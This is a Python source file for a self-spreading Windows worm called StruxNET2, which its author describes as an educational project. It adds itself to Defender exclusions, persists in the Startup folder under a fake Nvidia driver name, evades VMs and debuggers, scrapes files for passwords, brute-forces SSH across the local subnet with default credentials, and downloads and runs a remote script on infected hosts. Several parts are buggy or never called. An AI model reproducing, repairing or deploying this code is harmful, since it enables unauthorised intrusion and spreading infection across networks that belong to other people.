# before we start: I Made this Project for education and to suprise my Professors (I "study" it so not in the bad way lol)
# Just be carefull and yea. Credits: I used snippets from malware_showcase by PatrikH0lop and overwork them a little bit

# Version 1.1
# Copyright: WeepingAngel
# This is the Windows.EXE Payload


import os
import sys
from idlelib.run import exit_now
from importlib.metadata import requires
from ipaddress import ip_address
import subprocess
import scp
import paramiko
import re
import socket
import platform
import shutil
import urllib.request
import uuid
import ctypes


class WinSploit:
    def DefenderBypass(self):
        try:
            exe_path = os.path.abspath(sys.argv[0])  # Use the current script's path directly
            ps_command = f"Add-MpPreference -ExclusionPath '{exe_path}'"
            result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
            if result.returncode == 0:
                return "Bypassed"
            else:
                return "Failed"
        except Exception as e:
            return e

    def autostart(self):
        try:
            exe_path = os.path.abspath(sys.argv[0])
            autostart_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            random_name = f"NvidiaDriver_{uuid.uuid4()}.exe"
            destination_path = os.path.join(autostart_folder, random_name)
            shutil.copyfile(exe_path, destination_path)
            # Add the random name to the Defender exclusion
            self.DefenderBypass(destination_path)
        except Exception as e:
            return e

    def BypassVM(self): # Try to detect if system is running in a virtual debugging env
        if platform.system() == "Windows":
            try: # Virtual maschine detection
                output = subprocess.check_output("systeminfo", shell=True).decode()
                if "VMware" in output:
                    sys.exit(1)
                elif "VirtualBox" in output:
                    sys.exit(1)
            except Exception as e:
                pass
            try: # BIOS Detection
                with open('/sys/class/dmi/id/bios_version', 'r') as f:
                    bios_info = f.read().strip()
                    if "virtual" in bios_info.lower() or "vmware" in bios_info.lower() or "virtualbox" in bios_info.lower():
                        sys.exit(1)
                    else:
                        pass
            except Exception as e:
                pass
            if os.getenv('VT'): # VirusTotal Detection
                sys.exit(1)
            else:
                pass
            return "No VM detected"

    def AntiDebugging(self):
        if 'pydevd' in sys.modules or 'pdb' in sys.modules:
            return True
        else:
            pass
        if os.name == 'nt':
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            debugged = kernel32.IsDebuggerPresent()
            sys.exit(1)
        else:
            pass
        return False


class Spreader:
    def __init__(self, network_adress):
        self._network = network_adress

    @property
    def network(self):
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def thenest(self):
        common_user_passwords = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('test', 'test'),
            ('admin', 'password'),
            ('root', 'toor'),
            ('administrator', 'administrator'),
            ('ubuntu', 'ubuntu'),
            ('vagrant', 'vagrant'),
            ('pi', 'raspberry'),
            ('test', '123456'),
            ('admin', '123456'),
            ('root', '123456'),
            ('user', 'password'),
            ('guest', 'password'),
            ('mysql', 'mysql'),
            ('ftp', 'ftp'),
            ('apache', 'apache'),
            ('postgres', 'postgres'),
            ('oracle', 'oracle'),
            ('admin', 'admin123'),
            ('root', 'password'),
            ('user', '1234'),
            ('root', 'letmein'),
            ('root', '12345'),
            ('user', 'qwerty'),
            ('admin', 'admin2023'),
            ('root', 'root123'),
            ('admin', 'welcome'),
            ('root', '123qwe'),
            ('user', 'asdfgh'),
            ('guest', 'guest123')
        ]
        PASSWORD_PATTERN = re.compile(r'[A-Za-z0-9!@#$%^&*()_+=-]{8,}')
        search_files = directory="/"
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ingnore' ) as f:
                            content = f.read()
                            matches = PASSWORD_PATTERN.findall(content)
                            if matches:
                                for match in matches:
                                    passwordstrings = match
                                    return passwordstrings
                    except Exception as e:
                        return common_user_passwords
                else:
                    return common_user_passwords

    def generate_adresses_on_network(self):
        network = self.network.split('.')
        for host in range(1, 256):
            network[-1] = str(host)
            yield '.'.join(network)

    def spreading_mashine(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        script_url = "https://raw.githubusercontent.com/Crafttino21/StruxNET2/refs/heads/main/StruxNET2-Linux.py"
        local_program_files = os.environ.get('ProgramFiles', 'C:\\Program Files')
        local_script_path = os.path.join(local_program_files, "StruxNET2-Linux.py")
        try:
            urllib.request.urlretrieve(script_url, local_script_path)
        except Exception as e:
            return e

        for remote_address in self.generate_adresses_on_network():
            for user, passw in self.thenest:
                try:
                    ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)
                    with scp.SCPClient(ssh.get_transport()) as scp_client:
                        try:
                            remote_script_path = f"/tmp/{os.path.basename(local_script_path)}"
                            scp_client.put(local_script_path, remote_script_path)
                            stdin, stdout, stderr = ssh.exec_command("uname -s")
                            os_type = stdout.read().decode().strip()
                            if os_type == "Linux":
                                # Prüfen, welcher Paketmanager installiert ist
                                stdin, stdout, stderr = ssh.exec_command("""
                                    if [ -x "$(command -v apt)" ]; then
                                        echo apt;
                                    elif [ -x "$(command -v yum)" ]; then
                                        echo yum;
                                    elif [ -x "$(command -v dnf)" ]; then
                                        echo dnf;
                                    elif [ -x "$(command -v pacman)" ]; then
                                        echo pacman;
                                    elif [ -x "$(command -v zypper)" ]; then
                                        echo zypper;
                                    else
                                        echo unknown;
                                    fi
                                """)
                                package_manager = stdout.read().decode().strip()
                                stdin, stdout, stderr = ssh.exec_command("python3 --version")
                                python_installed = stdout.read().decode().strip()
                                if not python_installed:
                                    if package_manager == "apt":
                                        ssh.exec_command("sudo apt update && sudo apt install -y python3 python3-pip")
                                    elif package_manager == "yum":
                                        ssh.exec_command("sudo yum install -y python3 python3-pip")
                                    elif package_manager == "dnf":
                                        ssh.exec_command("sudo dnf install -y python3 python3-pip")
                                    elif package_manager == "pacman":
                                        ssh.exec_command("sudo pacman -Syu python python3-pip")
                                    elif package_manager == "zypper":
                                        ssh.exec_command("sudo zypper install -y python3 python3-pip")
                                    else:
                                        continue
                            stdin, stdout, stderr = ssh.exec_command(f"pip3 install scp paramiko requests")
                            stdin, stdout, stderr = ssh.exec_command(f"python3 {remote_script_path}")

                        except Exception as e:
                            continue
                except Exception as e:
                    continue

        ssh.close()

    def get_local_ip(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            s.close()
            return ip
        except Exception as e:
            return None





if __name__ == '__main__':
    win_sploit = WinSploit()
    win_sploit.autostart()
    win_sploit.DefenderBypass()
    win_sploit.BypassVM()
    win_sploit.AntiDebugging()
    ip = Spreader.get_local_ip()
    spread = Spreader(ip)